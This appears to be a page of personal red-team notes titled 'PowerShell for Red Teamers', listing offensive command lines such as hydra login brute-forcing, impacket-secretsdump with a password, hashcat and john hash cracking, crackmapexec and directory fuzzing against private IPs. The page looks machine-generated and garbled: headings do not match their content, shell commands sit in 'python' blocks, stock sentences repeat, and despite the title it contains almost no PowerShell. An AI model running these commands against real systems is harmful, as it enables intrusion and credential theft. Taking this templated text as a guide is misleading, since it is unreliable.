---
TitleSEO: "PowerShell for Red Teamers | ZureFX"
TitlePost: "PowerShell for Red Teamers"
Author: "ZureFX"
Description: "Personal notes on PowerShell for Red Teamers. Quick reference for pentesting and CTF challenges."
Keywords: "enumeration, oscp, windows, privilege escalation"
URL: "https://zurefx.github.io/notes/note-powershell-for-red-teamers-798.html"
URL_IMAGES: ""
Date: "2024-03-16"
Tags: "Enumeration, OSCP, Windows, Privilege Escalation"
Section: "notes"
Lang: "en"
main_img: "note-powershell-for-red-teamers-798"
Permalink: "/notes/note-powershell-for-red-teamers-798.html"
BtnLabel: "Read Notes"
Pick: 0
---
## NFS

### gobuster

The target system was identified as running a vulnerable version of the service. Post-exploitation enumeration revealed a path to domain administrator privileges.

```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.20.205.41 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.113.135.59 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Command injection was possible through unsanitized user input in the search functionality. Privilege escalation was possible due to misconfigured sudo permissions.

Authentication bypass was achieved through careful manipulation of the login mechanism. The service was running without proper input validation, leading to injection vulnerabilities. Unconstrained delegation was enabled on the compromised machine. Initial enumeration revealed several interesting open ports on the target.

## LDAP

### ldapsearch

Authentication bypass was achieved through careful manipulation of the login mechanism. Token impersonation allowed elevation to SYSTEM privileges on the target. The scheduled task ran with elevated privileges and could be abused for escalation. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
nmap -sCV -p9200,445,1521 10.28.163.32 -oN scan.txt
feroxbuster -h
```

```python
impacket-secretsdump administrator:'P@ssw0rd!'@10.74.145.159
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.97.113.55/FUZZ
```

- `netcat`
- `evil-winrm`
- `mimikatz`

## Ruby on Rails

### DNS Rebinding

```python
crackmapexec smb 10.31.76.6 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The service was running without proper input validation, leading to injection vulnerabilities. The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities. The service account had excessive permissions assigned in Active Directory.

The scheduled task ran with elevated privileges and could be abused for escalation. Command injection was possible through unsanitized user input in the search functionality. Weak file permissions allowed modification of critical system files. The backup files contained sensitive information that should not have been accessible.

- `SSRF`
- `Sudo Misconfiguration`
- `lookupsid`
- `SSTI`
- `Cron Job`

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.54.105.48/FUZZ
```

## Nginx

### burpsuite

Lateral movement was facilitated by reusing discovered credentials across services. Initial enumeration revealed several interesting open ports on the target. Initial enumeration revealed several interesting open ports on the target. Weak file permissions allowed modification of critical system files. The scheduled task ran with elevated privileges and could be abused for escalation.

The web application was vulnerable to Server-Side Template Injection (SSTI). Weak file permissions allowed modification of critical system files. Unconstrained delegation was enabled on the compromised machine. The kernel version was outdated and vulnerable to a publicly known exploit.

## ffuf

### wpscan

Lateral movement was facilitated by reusing discovered credentials across services. Group Policy Preferences contained encrypted but recoverable credentials. The backup files contained sensitive information that should not have been accessible. The kernel version was outdated and vulnerable to a publicly known exploit. Authentication bypass was achieved through careful manipulation of the login mechanism.

- `AlwaysInstallElevated`
- `Broken Access Control`
- `LAPS Abuse`
- `lookupsid`
- `enum4linux`
- `Command Injection`

```bash
gobuster dir -u http://10.100.35.70/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.99.134.6/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.52.234.160 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.52.146.85 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.227.78/FUZZ
```
